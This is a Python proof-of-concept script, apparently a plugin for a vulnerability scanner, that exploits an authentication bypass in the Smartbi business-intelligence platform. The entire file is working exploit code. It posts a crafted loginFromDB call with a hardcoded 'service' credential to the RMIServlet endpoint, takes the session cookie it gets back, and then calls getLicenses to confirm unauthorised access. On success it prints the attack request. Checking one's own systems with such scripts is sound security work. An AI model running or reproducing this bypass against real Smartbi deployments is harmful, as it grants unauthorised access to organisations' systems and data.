'''
Function:
    smartbi 身份认证绕过
Author:
    spmonkey，夜梓月
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/smartbi/vision/RMIServlet".format(scheme, netloc)
        data1 = {
            "className": "UserService",
            "methodName": "loginFromDB",
            "params": '["service","0a"]'
        }
        try:
            result_login = requests.post(url=url, data=data1, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if '"result":true' in result_login.text:
                cookie = result_login.headers["Set-Cookie"]
                self.headers["Cookie"] = cookie
                data2 = {
                    "className": "UserService",
                    "methodName": "getLicenses",
                    "params": '[]'
                }
                result = requests.post(url=url, data=data2, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if result.status_code == 200 and result.text != "":
                    target = urlparse(url)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在登录绕过漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result_login.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    for param, value in data1.items():
                        values = param + "=" + value
                        self.value_list.append(values)
                    self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False
